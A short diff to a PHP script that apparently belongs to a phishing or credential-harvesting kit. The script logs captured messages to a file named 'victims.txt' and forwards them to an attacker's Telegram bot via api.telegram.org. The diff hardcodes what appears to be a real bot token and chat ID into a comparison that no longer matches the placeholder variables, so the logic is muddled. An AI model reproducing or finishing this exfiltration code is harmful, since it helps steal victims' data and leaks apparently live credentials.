@@ -40,10 +40,11 @@ file_put_contents('victims.txt', $message, FILE_APPEND);
 $bot_token = 'YOUR_BOT_TOKEN';
 $chat_id = 'YOUR_CHAT_ID';
 
-if ($bot_token != 'YOUR_BOT_TOKEN' && $chat_id != 'YOUR_CHAT_ID') {
+if ($bot_token != '8518986165:AAH6RlmdDoB5DMuZT6F2MUnu21K_1k1rcQo' && $chat_id != '8300466523') {
     $url = "https://api.telegram.org/bot$bot_token/sendMessage";
     $data = ['chat_id' => $chat_id, 'text' => $message];
-    
+    // Send to Telegram (you'll replace these later)
+
     $options = [
         'http' => [
             'header' => "Content-type: application/x-www-form-urlencoded\r\n",
